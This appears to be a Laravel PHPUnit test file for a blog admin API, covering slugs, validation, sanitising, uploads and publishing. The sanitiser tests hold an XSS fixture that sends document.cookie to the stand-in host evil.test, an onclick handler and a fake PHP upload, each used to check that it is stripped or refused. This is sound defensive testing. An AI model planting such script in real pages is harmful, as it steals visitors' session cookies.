<?php

namespace Tests\Feature\Manager;

use App\Models\Admin;
use App\Models\BlogCategory;
use App\Models\BlogPost;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Tests\TestCase;

/**
 * Journal posts, written from the panel.
 */
class BlogPostTest extends TestCase
{
    use RefreshDatabase;

    private const ENDPOINT = '/api/manager/blog/posts';

    private Admin $admin;

    private BlogCategory $category;

    protected function setUp(): void
    {
        parent::setUp();

        $this->admin = Admin::factory()->create();
        $this->category = BlogCategory::factory()->create(['name' => 'Ingredients']);
    }

    private function asAdmin(): static
    {
        return $this->actingAs($this->admin, 'admin');
    }

    /**
     * @param  array<string, mixed>  $overrides
     * @return array<string, mixed>
     */
    private function payload(array $overrides = []): array
    {
        return array_merge([
            'title' => 'How to read an ingredient list',
            'category_id' => $this->category->id,
            'excerpt' => 'A short guide to the names on the back of the bottle.',
            'body' => '<p>Ingredients are listed by weight.</p><p>Position tells you a lot.</p>',
            'takeaways' => ['Order is by weight.', 'Amounts beat long names.'],
            'status' => 'published',
        ], $overrides);
    }

    /* ---------------------------------------------------------------- auth */

    public function test_the_endpoints_are_closed_to_guests(): void
    {
        $this->getJson(self::ENDPOINT)->assertUnauthorized();
        $this->postJson(self::ENDPOINT, $this->payload())->assertUnauthorized();
    }

    /* -------------------------------------------------------------- create */

    public function test_a_post_is_created(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload())
            ->assertStatus(201)
            ->assertJsonPath('data.title', 'How to read an ingredient list')
            ->assertJsonPath('data.slug', 'how-to-read-an-ingredient-list')
            ->assertJsonPath('data.status', 'published');

        $this->assertDatabaseHas('tbl_blog_posts', [
            'slug' => 'how-to-read-an-ingredient-list',
            'category_id' => $this->category->id,
        ]);
    }

    /**
     * The slug is an SEO field, so an operator may choose it - but it is still
     * put through the generator, which decides the shape and the uniqueness.
     */
    public function test_an_operator_can_choose_the_url(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['slug' => 'reading-a-label']))
            ->assertStatus(201)
            ->assertJsonPath('data.slug', 'reading-a-label');
    }

    public function test_a_chosen_url_is_still_slugified(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['slug' => 'Reading A Label!!']))
            ->assertStatus(422)
            ->assertJsonValidationErrors('slug');
    }

    public function test_a_chosen_url_cannot_take_one_that_is_taken(): void
    {
        BlogPost::factory()->create(['slug' => 'taken']);

        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['slug' => 'taken']))
            ->assertStatus(201)
            ->assertJsonPath('data.slug', 'taken-2');
    }

    public function test_a_blank_slug_falls_back_to_the_title(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['slug' => '']))
            ->assertStatus(201)
            ->assertJsonPath('data.slug', 'how-to-read-an-ingredient-list');
    }

    public function test_a_chosen_url_survives_a_title_change(): void
    {
        $post = BlogPost::factory()->create(['title' => 'Old', 'slug' => 'keep-this-url']);

        $this->asAdmin()
            ->postJson(self::ENDPOINT.'/'.$post->id, $this->payload([
                'title' => 'A completely different title',
                'slug' => 'keep-this-url',
            ]))
            ->assertOk()
            ->assertJsonPath('data.slug', 'keep-this-url');
    }

    public function test_two_posts_with_the_same_title_get_distinct_slugs(): void
    {
        $this->asAdmin()->postJson(self::ENDPOINT, $this->payload())->assertStatus(201);
        $this->asAdmin()->postJson(self::ENDPOINT, $this->payload())->assertStatus(201);

        $this->assertDatabaseHas('tbl_blog_posts', ['slug' => 'how-to-read-an-ingredient-list']);
        $this->assertDatabaseHas('tbl_blog_posts', ['slug' => 'how-to-read-an-ingredient-list-2']);
    }

    public function test_a_post_can_be_filed_without_a_category(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['category_id' => null]))
            ->assertStatus(201);

        $this->assertNull(BlogPost::firstOrFail()->category_id);
    }

    public function test_publishing_without_a_date_dates_the_post_now(): void
    {
        $this->asAdmin()->postJson(self::ENDPOINT, $this->payload())->assertStatus(201);

        $this->assertNotNull(BlogPost::firstOrFail()->published_at);
    }

    public function test_a_draft_gets_no_publish_date(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['status' => 'draft']))
            ->assertStatus(201);

        $this->assertNull(BlogPost::firstOrFail()->published_at);
    }

    /* --------------------------------------------------------------- body */

    /**
     * The reason the sanitiser exists: the body is printed unescaped on the
     * storefront, so nothing executable may reach the column.
     */
    public function test_a_script_in_the_body_never_reaches_the_database(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload([
                'body' => '<p>Fine</p><script>fetch("//evil.test?c="+document.cookie)</script>',
            ]))
            ->assertStatus(201);

        $body = BlogPost::firstOrFail()->body;

        $this->assertSame('<p>Fine</p>', $body);
        $this->assertStringNotContainsString('script', $body);
    }

    public function test_an_event_handler_is_stripped_from_the_body(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload([
                'body' => '<p onclick="steal()">Text</p>',
            ]))
            ->assertStatus(201);

        $this->assertSame('<p>Text</p>', BlogPost::firstOrFail()->body);
    }

    public function test_the_body_is_required(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['body' => '']))
            ->assertStatus(422)
            ->assertJsonValidationErrors('body');
    }

    /**
     * An untouched editor still posts a paragraph with a break in it. That
     * passes "required" and is not a post.
     */
    public function test_an_empty_editor_is_refused(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['body' => '<p><br></p>']))
            ->assertStatus(422)
            ->assertJsonPath('errors.body.0', 'Write something in the post body.');
    }

    /* ---------------------------------------------------------- reading time */

    public function test_the_reading_time_is_worked_out_from_the_body(): void
    {
        // 600 words at 200 a minute.
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload([
                'body' => '<p>'.str_repeat('word ', 600).'</p>',
            ]))
            ->assertStatus(201);

        $this->assertSame(3, BlogPost::firstOrFail()->read_minutes);
    }

    public function test_a_reading_time_the_operator_typed_is_kept(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['read_minutes' => 12]))
            ->assertStatus(201);

        $this->assertSame(12, BlogPost::firstOrFail()->read_minutes);
    }

    /* ---------------------------------------------------------- takeaways */

    public function test_blank_takeaway_lines_are_discarded(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload([
                'takeaways' => ['Kept', '', '   ', 'Also kept'],
            ]))
            ->assertStatus(201);

        $this->assertSame(['Kept', 'Also kept'], BlogPost::firstOrFail()->takeawayList());
    }

    public function test_a_post_with_no_takeaways_stores_null(): void
    {
        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['takeaways' => []]))
            ->assertStatus(201);

        $this->assertNull(BlogPost::firstOrFail()->takeaways);
    }

    /* --------------------------------------------------------------- update */

    public function test_a_post_is_updated(): void
    {
        $post = BlogPost::factory()->create(['title' => 'Old title']);

        $this->asAdmin()
            ->postJson(self::ENDPOINT.'/'.$post->id, $this->payload(['title' => 'New title']))
            ->assertOk()
            ->assertJsonPath('data.title', 'New title')
            ->assertJsonPath('data.slug', 'new-title');
    }

    /**
     * An edit that does not touch the title must not invalidate a URL that is
     * already indexed and linked to.
     */
    public function test_the_slug_only_changes_when_the_title_does(): void
    {
        $post = BlogPost::factory()->create(['title' => 'Keep me', 'slug' => 'keep-me']);

        $this->asAdmin()
            ->postJson(self::ENDPOINT.'/'.$post->id, $this->payload([
                'title' => 'Keep me',
                'excerpt' => 'Reworded blurb.',
            ]))
            ->assertOk();

        $this->assertSame('keep-me', $post->fresh()->slug);
    }

    public function test_the_view_count_cannot_be_set_from_the_form(): void
    {
        $post = BlogPost::factory()->create(['views_count' => 42]);

        $this->asAdmin()
            ->postJson(self::ENDPOINT.'/'.$post->id, $this->payload(['views_count' => 9999]))
            ->assertOk();

        $this->assertSame(42, $post->fresh()->views_count);
    }

    /* --------------------------------------------------------------- featured */

    public function test_featuring_a_post_unfeatures_the_last_one(): void
    {
        $old = BlogPost::factory()->featured()->create();

        $this->asAdmin()
            ->postJson(self::ENDPOINT, $this->payload(['is_featured' => true]))
            ->assertStatus(201);

        $this->assertFalse($old->fresh()->is_featured);
        $this->assertSame(1, BlogPost::query()->where('is_featured', true)->count());
    }

    /* ------------------------------------------------------- toggle / delete */

    public function test_a_post_can_be_published_and_unpublished(): void
    {
        $post = BlogPost::factory()->draft()->create();

        $this->asAdmin()
            ->patchJson(self::ENDPOINT.'/'.$post->id.'/toggle')
            ->assertOk()
            ->assertJsonPath('data.status', 'published');

        $this->assertNotNull($post->fresh()->published_at);

        $this->asAdmin()
            ->patchJson(self::ENDPOINT.'/'.$post->id.'/toggle')
            ->assertOk()
            ->assertJsonPath('data.status', 'draft');
    }

    public function test_a_post_is_soft_deleted(): void
    {
        $post = BlogPost::factory()->create();

        $this->asAdmin()->deleteJson(self::ENDPOINT.'/'.$post->id)->assertOk();

        $this->assertSoftDeleted('tbl_blog_posts', ['id' => $post->id]);
    }

    /* ----------------------------------------------------------------- cover */

    public function test_a_cover_image_is_stored_and_can_be_removed(): void
    {
        $this->asAdmin()
            ->post(self::ENDPOINT, $this->payload([
                'cover' => UploadedFile::fake()->image('cover.jpg', 1200, 600),
            ]))
            ->assertStatus(201);

        $post = BlogPost::firstOrFail();

        $this->assertNotNull($post->cover_path);
        $this->assertFileExists(public_path($post->cover_path));

        $path = public_path($post->cover_path);

        $this->asAdmin()
            ->post(self::ENDPOINT.'/'.$post->id, $this->payload(['remove_cover' => 1]))
            ->assertOk();

        $this->assertNull($post->fresh()->cover_path);
        $this->assertFileDoesNotExist($path);
    }

    public function test_a_non_image_upload_is_refused(): void
    {
        $this->asAdmin()
            ->post(self::ENDPOINT, $this->payload([
                'cover' => UploadedFile::fake()->create('payload.php', 12, 'application/x-php'),
            ]))
            ->assertStatus(422)
            ->assertJsonValidationErrors('cover');
    }

    /* --------------------------------------------------------------- screens */

    public function test_the_panel_screens_render(): void
    {
        $post = BlogPost::factory()->create(['title' => 'A written post']);

        $this->asAdmin()->get('/manager/blog')->assertOk()->assertSee('A written post');
        $this->asAdmin()->get('/manager/blog/create')->assertOk()->assertSee('data-editor', false);
        $this->asAdmin()->get('/manager/blog/'.$post->id.'/edit')->assertOk()->assertSee('A written post');
    }

    public function test_the_list_can_be_filtered_by_status(): void
    {
        BlogPost::factory()->create(['title' => 'Live one']);
        BlogPost::factory()->draft()->create(['title' => 'Unfinished one']);

        $this->asAdmin()
            ->get($this->managerUrl('manager.blog.index', ['status' => 'draft']))
            ->assertOk()
            ->assertSee('Unfinished one')
            ->assertDontSee('Live one');
    }
}
